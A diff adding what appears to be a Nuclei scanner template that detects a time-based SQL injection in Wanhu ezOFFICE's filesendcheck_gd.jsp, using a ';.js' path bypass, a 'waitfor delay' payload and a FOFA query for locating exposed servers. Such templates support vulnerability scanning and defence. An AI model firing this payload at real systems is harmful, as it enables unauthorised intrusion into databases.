@@ -1,0 +1,46 @@
+id: poc-yaml-wanhu-ezoffice-filesendcheck-sqli
+info:
+  name: 万户 ezOFFICE filesendcheck SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 万户OA ezoffice
+    fofa-query: app="万户网络-ezOFFICE"
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "whirRootPath"
+        part: body
+
+  - raw:
+      - |
+        GET /defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "正在归档中,请稍后"
+        part: body
+      - type: dsl
+        dsl:
+          - duration > t1
+          - duration < t2
